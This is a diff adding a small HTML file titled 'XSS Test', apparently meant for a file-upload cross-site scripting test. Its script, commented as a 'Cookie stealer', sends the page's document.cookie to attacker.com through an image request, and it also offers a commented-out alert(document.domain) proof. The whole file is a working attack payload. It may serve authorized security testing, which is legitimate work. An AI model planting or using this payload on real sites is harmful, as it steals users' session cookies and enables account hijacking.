@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS Test</title></head>
+<body>
+  <h1>File Upload XSS</h1>
+  <script>
+    // Cookie stealer
+    new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
+    // Or simpler:
+    // alert(document.domain);
+  </script>
+</body>
+</html>
